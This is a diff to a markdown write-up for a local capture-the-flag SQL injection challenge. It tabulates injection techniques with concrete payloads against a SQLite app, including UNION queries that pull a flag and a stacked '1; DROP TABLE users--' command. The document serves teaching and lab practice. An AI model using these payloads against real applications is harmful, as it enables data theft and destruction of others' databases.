@@ -44,8 +44,8 @@ To demonstrate this, here is a list of the common sql attacks and how they fail 
 | **String‑based tautology** | **No** (needs quotes) | **Yes** | `0 OR 'a'='a'--` | Quotes make it easy to force TRUE but blocked in filtered version. |
 | **UNION‑based** | **Yes** | **Yes** | `0 UNION SELECT flag FROM very_secret--` | Column count = 1 matches `name` and returns the flag.                                                               |
 | **UNION + targeted schema query** | **Harder** (Solution Path) | **Yes** | `0 UNION SELECT sql FROM sqlite_master WHERE name='very_secret'--` | With quotes, it directly filter to the target table, without quotes, it’s simpler. |
-| **Boolean‑based blind** | **Possible** (sql functions) | **Easier** (use quoted chars/LIKE)  | With filter: `1 AND substr((SELECT flag FROM very_secret),1,1)=char(102)--`  \| Without filter: `1 AND substr((SELECT flag FROM very_secret),1,1)='f'--` | You can infer TRUE/FALSE by response difference (`User name: …` vs `Len=0`).                                         |
-| **Error‑based** | **Weak** (generic “SQL error” hides details) | **Still weak** (same masking) | `1'`  | App returns just “SQL error”, so you can’t infer from error text either way. |
+| **Boolean‑based blind** | **Possible** (sql functions) | **Easier** (use quoted chars/LIKE)  | With filter: `1 AND substr((SELECT flag FROM very_secret),1,1)=char(102)--`  \| Without filter: `1 AND substr((SELECT flag FROM very_secret),1,1)='f'--` | You can get TRUE/FALSE by response difference (`User name: …` vs `Len=0`).                                         |
+| **Error‑based** | **Weak** (generic “SQL error” hides details) | **Still weak** | `1'`  | App returns just “SQL error”, so you can’t infer from error text either way. |
 | **Time‑based blind** | **N/A** | **N/A** | **N/A** | SQLite doesn’t have a sleep functions |
 | **Stacked queries**  | **No** | **Yes** | `1; DROP TABLE users--` | `sqlite3.execute()` only allows one statement so stacked won’t run unless the app used `executescript()`. |
 
@@ -56,9 +56,9 @@ To demonstrate this, here is a list of the common sql attacks and how they fail 
 
 
 0. Run the server
-Use python3 app.py in web-xss-csp
-Make sure that all dependencies are present
-head to the home page
+- Use python3 app.py in web-sqli-filtered
+- Make sure that all dependencies are present
+- head to the home page https://127.0.0.1:5000
 
 
 
